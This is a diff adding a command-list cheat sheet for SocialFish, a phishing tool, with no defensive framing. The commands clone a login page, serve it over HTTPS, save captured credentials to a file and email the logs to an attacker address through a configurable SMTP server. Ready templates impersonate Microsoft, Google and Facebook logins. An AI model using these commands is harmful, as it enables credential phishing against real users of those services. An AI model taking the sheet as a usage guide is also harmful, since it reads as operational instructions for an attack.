@@ -1,0 +1,58 @@
+[X] SocialFish Command List
+
+[\] python3 SocialFish.py
+[/] Launch SocialFish
+
+[\] python3 SocialFish.py --help
+[/] Show help menu
+
+[\] python3 SocialFish.py --set-url https://login.example.com
+[/] Clone a login page
+
+[\] python3 SocialFish.py --set-port 8080
+[/] Set phishing server port
+
+[\] python3 SocialFish.py --ssl
+[/] Enable HTTPS
+
+[\] python3 SocialFish.py --cert cert.pem --key key.pem
+[/] Use custom SSL certificate
+
+[\] python3 SocialFish.py --output creds.txt
+[/] Save captured credentials
+
+[\] python3 SocialFish.py --debug
+[/] Enable debug mode
+
+[\] python3 SocialFish.py --no-verify
+[/] Disable SSL verification
+
+[\] python3 SocialFish.py --email attacker@example.com
+[/] Set email for receiving logs
+
+[\] python3 SocialFish.py --smtp smtp.example.com
+[/] Set SMTP server
+
+[\] python3 SocialFish.py --smtp-port 587
+[/] Set SMTP port
+
+[\] python3 SocialFish.py --smtp-user user
+[/] SMTP username
+
+[\] python3 SocialFish.py --smtp-pass pass
+[/] SMTP password
+
+[\] python3 SocialFish.py --template microsoft
+[/] Use Microsoft login template
+
+[\] python3 SocialFish.py --template google
+[/] Use Google login template
+
+[\] python3 SocialFish.py --template facebook
+[/] Use Facebook login template
+
+[\] python3 SocialFish.py --template custom
+[/] Use custom HTML template
+
+[\] python3 SocialFish.py --update
+[/] Update SocialFish
